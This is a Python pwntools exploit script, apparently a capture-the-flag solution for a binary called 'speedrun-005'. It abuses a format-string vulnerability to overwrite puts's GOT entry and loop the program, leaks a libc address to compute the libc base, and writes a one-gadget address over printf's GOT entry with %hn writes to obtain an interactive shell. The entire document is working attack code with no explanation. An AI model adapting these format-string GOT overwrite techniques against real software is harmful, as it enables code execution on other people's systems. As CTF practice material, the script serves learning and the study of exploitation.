#!/usr/bin/env python
# coding=utf-8
from pwn import *
a=process("./speedrun-005")
elf=ELF("./speedrun-005")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.terminal=["tmux","splitw","-h"]
def debug():
    gdb.attach(a,'''
    b *0x000000000400701

               ''')
def get_num(printed,need):
    if printed>need:
        return 0x100000-printed+need
    elif printed == need:
        return 0
    else:
        return need-printed

def fsb(payload):
    a.recvuntil("this time? ")
    a.send(payload)
    a.recvuntil("Interesting ")
puts_got=0x601018
offset=6

payload="%"+str(0x00000000040069D)+"c"+'%11$lln'
payload=payload.ljust(40,'\x00')
payload+=p64(puts_got)
fsb(payload)  # pus_got ==> 0x400729

fsb("%109$p")

libc_base=int(a.recv(14),16)-153-libc.symbols["printf"]
success("libc_base ==> 0x%x"%libc_base)

#system_addr=libc_base+libc.symbols["system"]
system_addr=libc_base+0x45216
printf_got=elf.got["printf"]

h1=system_addr&0xffff
h2=system_addr>>16&0xffff
l1=h1
l2=get_num(l1,h2)
payload="%"+str(l1)+"c"+"%13$hn"
payload+="%"+str(l2)+"c"+"%14$hn"
print payload
payload=payload.ljust(40+16,'\x00')
payload+=p64(printf_got)+p64(printf_got+2)
fsb(payload)
a.interactive()